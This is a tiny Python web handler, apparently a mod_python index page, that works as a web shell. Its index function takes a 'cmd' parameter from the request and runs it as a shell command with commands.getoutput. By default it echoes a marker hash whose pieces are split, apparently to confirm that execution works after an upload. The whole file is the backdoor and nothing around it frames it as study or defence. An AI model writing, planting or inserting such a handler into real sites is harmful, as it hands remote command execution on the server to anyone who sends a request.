import commands

def index(req, cmd='echo "15825b40c6dace2a' + '7cf5d4ab8ed434d5"' ):
    return commands.getoutput( cmd )
